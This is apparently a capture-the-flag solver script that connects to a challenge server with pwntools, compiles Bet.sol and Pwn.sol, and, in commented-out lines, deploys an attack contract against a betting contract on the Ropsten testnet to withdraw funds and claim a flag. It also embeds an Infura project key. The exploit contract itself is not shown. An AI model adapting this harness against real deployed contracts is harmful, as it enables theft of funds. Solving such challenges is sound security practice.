#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
from address import *
import json
from web3 import Web3
from solc import compile_standard
import time
from pwn import  *

Bet = open('./Bet.sol').read()
Pwn = open('./Pwn.sol').read()
p = remote('140.112.31.97', '30004')


def Start():
    global w3, FACTORY_ADDRESS, token, FACTORY_ABI, FACTORY_BYTECODE, Pwn_ABI, Pwn_BYTECODE

    p.recvuntil('>')
    p.sendline("1")
    p.recvuntil('Factory Contract Address : ')
    FACTORY_ADDRESS = p.recvline()[:-1].decode('ascii')
    p.recvuntil('call validate(')
    token = int(p.recv(66), 16)
    p.recvuntil("----- flag will appear below -----")

    w3 = Web3(Web3.WebsocketProvider('wss://ropsten.infura.io/ws/v3/faa6cd8da8984cc7b95b935d1bede5c7'))
    Bet_sol = compile_standard({
        "language": "Solidity",
        "sources":
        {
            "Bet.sol": {
                "content": Bet
            }
        },
        "settings":
        {
            "outputSelection": {
                "*": {
                    "*": [
                        "metadata", "evm.bytecode"
                        , "evm.bytecode.sourceMap"
                    ]
                }
            }
        }
    })

    Pwn_sol = compile_standard({
        "language": "Solidity",
        "sources":
        {
            "Pwn.sol": {
                "content": Pwn
            }
        },
        "settings":
        {
            "outputSelection": {
                "*": {
                    "*": [
                        "metadata", "evm.bytecode"
                        , "evm.bytecode.sourceMap"
                    ]
                }
            }
        }
    })

    FACTORY_ABI = json.loads(Bet_sol['contracts']['Bet.sol']['BetFactory']['metadata'])['output']['abi']
    FACTORY_BYTECODE = Bet_sol['contracts']['Bet.sol']['BetFactory']['evm']['bytecode']['object']

    Pwn_ABI = json.loads(Pwn_sol['contracts']['Pwn.sol']['Pwn']['metadata'])['output']['abi']
    Pwn_BYTECODE = Pwn_sol['contracts']['Pwn.sol']['Pwn']['evm']['bytecode']['object']

if __name__ == "__main__":
    
    Start()

    # pwn = Contract(Pwn_ABI, Pwn_BYTECODE, "0x06920D78250A378c6796b8958162A455F47f8229")

    # pwn.send_transaction('create', address, private_key, FACTORY_ADDRESS, value = 	500000000000000000)

    # factory = Contract(FACTORY_ABI, FACTORY_BYTECODE, FACTORY_ADDRESS)

    # Bet_ADDRESS = factory.call('instances', address)

    # pwn.send_transaction('run', address, private_key, Bet_ADDRESS, value = 	500000000000000000)

    # pwn.send_transaction('validate', address, private_key, FACTORY_ADDRESS, token)

    # pwn.send_transaction('withdraw', address, private_key)

    # print("END")

    # while True:
    #     print(p.recvline())
    #     time.sleep(1)